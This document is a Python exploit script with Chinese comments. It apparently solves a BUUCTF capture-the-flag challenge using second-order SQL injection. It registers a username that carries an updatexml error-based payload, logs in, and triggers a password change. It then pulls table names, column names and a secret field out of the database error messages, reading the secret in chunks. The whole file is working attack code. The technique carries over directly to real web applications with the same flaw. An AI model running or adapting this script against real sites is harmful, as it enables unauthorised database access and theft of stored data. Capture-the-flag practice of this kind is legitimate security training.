import requests
import re

#配置URL
target_url = "http://bbf0d924-ce78-4237-b47e-1a9dd43464f1.node5.buuoj.cn:81"#目标在这
register_url = f"{target_url}/register.php"
login_url = f"{target_url}/login.php"
update_url = f"{target_url}/changepwd.php"#按需求更改子页面

def get_flag(payload):
    session = requests.Session()
    
    # 注册恶意用户 (利用二次注入)
    # 这里的 payload 是关键，通过 || 连接报错函数
    # 注意：payload 长度有限制，尽量精简
    username = f"\"||{payload}#" 
    
    reg_data = {
        "username": username,
        "password": "123",
        "email": "test@test.com"
    }
    session.post(register_url, data=reg_data)

    # 2. 登录该用户
    login_data = {
        "username": username,
        "password": "123"
    }
    session.post(login_url, data=login_data)

    # 3. 触发修改密码操作，获取报错信息
    # 实际上由于 username 已注入，后台执行 UPDATE 语句时会报错
    update_data = {
        "oldpass": "123",
        "newpass": "456"
    }
    response = session.post(update_url, data=update_data)
    
    # 4. 从响应中正则匹配报错内容 (updatexml 报错在 ~ 之间)
    result = re.findall(r'~(.*?)~', response.text)
    if result:
        return result[0]
    return None

# --- 自动化执行流 ---

print("[*] 开始探测表名...")
# 查表名：这里直接查 users 表是否包含 flag
# select(table_name)from(information_schema.tables)where(table_schema=database())limit(0,1)
table_payload = "updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema=database())limit(0,1)),0x7e),1)"
print(f"[+] Table: {get_flag(table_payload)}")

print("\n[*] 开始探测列名...")
# 查 users 表的列名 (这题 flag 通常在 real_name 字段)
column_payload = "updatexml(1,concat(0x7e,(select(column_name)from(information_schema.columns)where(table_name='users')limit(3,1)),0x7e),1)"
print(f"[+] Column: {get_flag(column_payload)}")

print("\n[*] 开始读取 Flag...")
# 因为 updatexml 限制 32 位，我们需要分段读取 (mid 函数)
for i in range(1, 3): # 读两次，每次 30 字符
    start = (i-1)*30 + 1
    flag_payload = f"updatexml(1,concat(0x7e,(select(mid(real_name,{start},30))from(users)where(username='admin')),0x7e),1)"
    part = get_flag(flag_payload)
    if part:
        print(f"[+] Part {i}: {part}", end="")
print("\n[!] 抓取完成。")